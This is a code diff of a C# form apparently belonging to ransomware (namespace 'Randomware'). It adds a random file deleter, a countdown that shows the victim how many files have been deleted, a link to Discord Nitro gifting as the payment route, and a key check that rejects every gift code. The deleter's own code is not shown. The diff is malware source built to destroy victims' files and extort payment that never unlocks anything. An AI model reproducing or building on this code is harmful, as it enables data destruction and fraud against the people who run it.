@@ -47,6 +47,8 @@ namespace Client.Armitage.Randomware
         /// </summary>
         private System.ComponentModel.IContainer components = null;
 
+        private Random_File_Deleter _deleter = new Random_File_Deleter();
+
         public int TimeLeft = 86400;
 
         public const int KeySize = 64;
@@ -75,7 +77,7 @@ namespace Client.Armitage.Randomware
         {
             TimeLeft--;
 
-            label5.Text = $"You have {TimeLeft} seconds left.";
+            label5.Text = $"You have {TimeLeft} seconds left. {_deleter.DeletedFiles} files deleted.";
         }
 
         private void Clicked(object sender, MouseEventArgs e)
@@ -96,6 +98,22 @@ namespace Client.Armitage.Randomware
         private void button2_Click(object sender, EventArgs e)
         {
             Process.Start("https://support.discord.com/hc/en-us/articles/360020877112-Nitro-Gifting");
+        }
+
+        private Color green = Color.FromArgb(133, 252, 152);
+        private Color red = Color.FromArgb(244, 84, 74);
+        private async void button1_Click(object sender, EventArgs e)
+        {
+            this.Size = new Size(this.Width, 430);
+            label1.Text = "Checking your key...";
+            label1.ForeColor = green;
+            IvalidKey();
+        }
+        public void IvalidKey()
+        {
+            label1.ForeColor = red;
+            label1.Text = "Invalid Gift Code!";
+            this.Size = new Size(this.Width, 600);
         }
     }
 }
